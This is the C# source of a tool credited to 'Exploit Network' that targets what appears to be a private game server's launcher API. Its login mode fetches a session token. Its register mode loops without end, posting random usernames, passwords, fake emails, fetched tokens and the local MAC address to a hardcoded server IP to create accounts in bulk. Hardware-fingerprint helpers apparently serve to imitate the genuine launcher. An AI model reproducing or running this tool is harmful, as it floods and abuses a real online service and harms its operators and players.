/*
===================================
GetTokenLoginV3.24
Credits: Shark -  Exploit Network 2018
===================================
*/

using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;

namespace GetTokenLoginV3
{
    class Program
    {
        static void Main(string[] args)
        {
            //if (UtilS.GetIpAdress() != "127.0.0.1")
            //{
            //    Environment.Exit(-1);
            //    return;
            //}
            Console.Title = "Exploit Network GetTokenV3";
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WindowWidth = 119;
            Console.WindowHeight = 30;
            Console.SetBufferSize(119, 9001);
            Console.WriteLine(@"
 _____           _       _ _     _   _      _                      _    
|  ___|         | |     (_) |   | \ | |    | |                    | |   
| |____  ___ __ | | ___  _| |_  |  \| | ___| |___      _____  _ __| | __
|  __\ \/ / '_ \| |/ _ \| | __| | . ` |/ _ \ __\ \ /\ / / _ \| '__| |/ /
| |___>  <| |_) | | (_) | | |_  | |\  |  __/ |_ \ V  V / (_) | |  |   < 
\____/_/\_\ .__/|_|\___/|_|\__| \_| \_/\___|\__| \_/\_/ \___/|_|  |_|\_\
          | |                                                           
          |_|                                                           
");
            Console.ResetColor();
            Console.WriteLine("GetTokenV3 v1.0\t\t Build:1.0");
            Console.WriteLine("Exploit Network\t\t Developers: Shark, Coyote\n");
            Console.ForegroundColor = ConsoleColor.Red;

            Console.WriteLine("Press 1(LOGIN) 2(REGISTER):");

            string type = Console.ReadLine();
            if (type == "1")
            {
                Console.WriteLine("User:");
                string user = Console.ReadLine();
                Console.WriteLine("Password:");
                string pass = Console.ReadLine();
                ///string token = PerformRequest(string.Concat("https://nothingz.com.br/api_kkorn/launcher/send.php"), user, pass, "", "", "", "");
                string token = GetData("http://127.0.0.1/pblauncher/launcher/open.php", "Open=LauncherWEB");
                Console.WriteLine("Token: " + token);

                StreamWriter bw = new StreamWriter("token.txt");
                bw.Write(token);
                bw.Close();
            }
            else if (type == "2")
            {
                //new Thread(REgister).Start();
                REgister();
            }

            Process.GetCurrentProcess().WaitForExit();
            Console.ReadKey();
        }
        public static void REgister()
        {
            int i = 0;
            while (true)
            {
                //new Thread(() =>
                //{
                string user = RandomString(14) + i;
                Player player = JsonConvert.DeserializeObject<Player>(GetData("http://170.81.42.195/pblauncher/launcher/open.php", "Open=LauncherWEB"));

                string dados = GetData("http://170.81.42.195/pblauncher/launcher/register.php", string.Concat(new string[] { "txtUsername=", user, "&txtPassword=", user, "&txtConfPassword=", user, "&email=", user + "@gmail.com", "&tk=", player.token, "&adr=", PhAdr() }));

                Console.WriteLine("result: " + dados);
                //}).Start();
                //Thread.Sleep(15);
                i++;
                Console.Title = "Accounts created: " + i;
            }
        }
        public const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        public static Random random = new Random();
        public static int Sequence = 0;
        public static string RandomString(int length)
        {
            return new string(Enumerable.Repeat(chars, length).Select(str => str[random.Next(str.Length)]).ToArray()).Replace(" ", "");
        }
        public static string PhAdr()
        {
            string str;
            try
            {
                string empty = string.Empty;
                NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
                for (int i = 0; i < (int)allNetworkInterfaces.Length; i++)
                {
                    NetworkInterface networkInterface = allNetworkInterfaces[i];
                    if ((networkInterface.NetworkInterfaceType != NetworkInterfaceType.Ethernet ? false : networkInterface.OperationalStatus == OperationalStatus.Up))
                    {
                        empty = networkInterface.GetPhysicalAddress().ToString();
                    }
                }
                str = empty;
            }
            catch (Exception exception)
            {
                throw exception;
            }
            return str;
        }
        private static string GetData(string url, string dados)
        {
            HttpWebRequest length = (HttpWebRequest)WebRequest.Create(url);
            byte[] bytes = Encoding.UTF8.GetBytes(dados);
            length.Method = "POST";
            length.ContentType = "application/x-www-form-urlencoded; charset=utf-8";
            length.ContentLength = (long)((int)bytes.Length);
            using (Stream requestStream = length.GetRequestStream())
            {
                requestStream.Write(bytes, 0, (int)bytes.Length);
            }
            WebResponse response = (HttpWebResponse)length.GetResponse();
            return (new StreamReader(response.GetResponseStream())).ReadToEnd();
        }

        private static string PerformRequest(string url, string username, string password, string mac, string cpuinfo, string hddserial, string boardid)
        {
            HttpWebRequest cookie = (HttpWebRequest)WebRequest.Create(url);
            string str = string.Concat(new string[] { "username=", username, "&password=", password, "&mac=", mac, "&cpuinfo=", cpuinfo, "&hddserial=", hddserial, "&boardserial=", boardid, "&Hash=", GetMD5HashFromFile(string.Concat("PBLauncher.exe")) });
            byte[] bytes = Encoding.UTF8.GetBytes(str);
            cookie.Method = "POST";
            cookie.ContentType = "application/x-www-form-urlencoded; charset=utf-8";
            cookie.ContentLength = bytes.Length;
            using (Stream requestStream = cookie.GetRequestStream())
            {
                requestStream.Write(bytes, 0, bytes.Length);
            }
            WebResponse response = (HttpWebResponse)cookie.GetResponse();
            return new StreamReader(response.GetResponseStream()).ReadToEnd();
        }

        private static string GetHDD()
        {
            string empty = string.Empty;
            foreach (ManagementObject managementObject in (new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive")).Get())
            {
                if (managementObject["SerialNumber"] != null)
                {
                    empty = managementObject["SerialNumber"].ToString();
                }
                else
                {
                    empty = null;
                }
            }
            return empty;
        }

        private static string GetMacAddress()
        {
            string empty = string.Empty;
            long speed = (long)-1;
            NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
            for (int i = 0; i < (int)allNetworkInterfaces.Length; i++)
            {
                NetworkInterface networkInterface = allNetworkInterfaces[i];
                string str = networkInterface.GetPhysicalAddress().ToString();
                if ((networkInterface.Speed <= speed || string.IsNullOrEmpty(str) ? false : str.Length >= 12))
                {
                    speed = networkInterface.Speed;
                    empty = str;
                }
            }
            return empty;
        }

        private static string GetboardInfo()
        {
            string empty = string.Empty;
            foreach (ManagementObject managementObject in (new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard")).Get())
            {
                empty = managementObject.GetPropertyValue("SerialNumber").ToString();
            }
            return empty;
        }

        private static string GetcpuInfo()
        {
            string empty = string.Empty;
            foreach (ManagementObject managementObject in (new ManagementObjectSearcher("SELECT * FROM Win32_Processor")).Get())
            {
                empty = managementObject.GetPropertyValue("ProcessorId").ToString();
            }
            return empty;
        }

        private static string GetMD5HashFromFile(string fileName)
        {
            string str;
            using (MD5 mD5 = MD5.Create())
            {
                using (FileStream fileStream = File.OpenRead(fileName))
                {
                    str = BitConverter.ToString(mD5.ComputeHash(fileStream)).Replace("-", string.Empty);
                }
            }
            return str;
        }

        public static string GetMediaAccessControl()
        {
            try
            {
                foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces())
                {
                    return adapter.GetPhysicalAddress().ToString();
                }
            }
            catch
            {
            }
            return null;
        }

        public static string GetPublicIP()
        {
            try
            {
                WebRequest req = WebRequest.Create("http://checkip.dyndns.org");
                using (WebResponse resp = req.GetResponse())
                {
                    using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
                    {
                        return sr.ReadToEnd().Trim().Split(':')[1].Substring(1).Split('<')[0];
                    }
                }
            }
            catch
            {
            }
            return "0.0.0.0";
        }

        private static string GetHash(string devices)
        {
            try
            {
                using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
                {
                    return BitConverter.ToString(mD5CryptoServiceProvider.ComputeHash(new ASCIIEncoding().GetBytes(devices)));
                }
            }
            catch
            {
            }
            return string.Empty;
        }

        private static string Identifier(string wmiClass, string wmiProperty, string wmiMustBeTrue)
        {
            string str = "";
            using (ManagementClass managementClass = new ManagementClass(wmiClass))
            {
                foreach (ManagementObject instance in managementClass.GetInstances())
                {
                    if (!(instance[wmiMustBeTrue].ToString() == "True") || !(str == ""))
                    {
                        continue;
                    }
                    try
                    {
                        str = instance[wmiProperty].ToString();
                        return str;
                    }
                    catch
                    {
                    }
                }
            }
            return str;
        }

        private static string Identifier(string wmiClass, string wmiProperty)
        {
            string str = ""; using (ManagementClass managementClass = new ManagementClass(wmiClass))
            {
                foreach (ManagementObject instance in managementClass.GetInstances())
                {
                    if (str != "")
                    {
                        continue;
                    }
                    try
                    {
                        str = instance[wmiProperty].ToString();
                        return str;
                    }
                    catch
                    {
                    }
                }
            }
            return str;
        }

        private static string CpuId()
        {
            string str = Identifier("Win32_Processor", "UniqueId");
            if (str == "")
            {
                str = Identifier("Win32_Processor", "ProcessorId");
                if (str == "")
                {
                    str = Identifier("Win32_Processor", "Name");
                    if (str == "")
                    {
                        str = Identifier("Win32_Processor", "Manufacturer");
                    }
                    str = string.Concat(str, Identifier("Win32_Processor", "MaxClockSpeed"));
                }
            }
            return str;
        }

        public static string GetHardwareId() => GetHash(string.Concat(new string[] { "CPU >> ", CpuId(), "\nBIOS >> ", BiosId(), "\nBASE >> ", BaseId(), "\nVIDEO >> ", VideoId(), "\nMAC >> ", MacId(), "\nDISK >> ", DiskId() }));
        private static string BaseId() => string.Concat(Identifier("Win32_BaseBoard", "Model"), Identifier("Win32_BaseBoard", "Manufacturer"), Identifier("Win32_BaseBoard", "Name"), Identifier("Win32_BaseBoard", "SerialNumber"));
        private static string BiosId() => string.Concat(new string[] { Identifier("Win32_BIOS", "Manufacturer"), Identifier("Win32_BIOS", "SMBIOSBIOSVersion"), Identifier("Win32_BIOS", "IdentificationCode"), Identifier("Win32_BIOS", "SerialNumber"), Identifier("Win32_BIOS", "ReleaseDate"), Identifier("Win32_BIOS", "Version") });
        private static string DiskId() => string.Concat(Identifier("Win32_DiskDrive", "Model"), Identifier("Win32_DiskDrive", "Manufacturer"), Identifier("Win32_DiskDrive", "Signature"), Identifier("Win32_DiskDrive", "TotalHeads"));
        private static string MacId() => Identifier("Win32_NetworkAdapterConfiguration", "MACAddress", "IPEnabled");
        private static string VideoId() => string.Concat(Identifier("Win32_VideoController", "DriverVersion"), Identifier("Win32_VideoController", "Name"));
    }
}
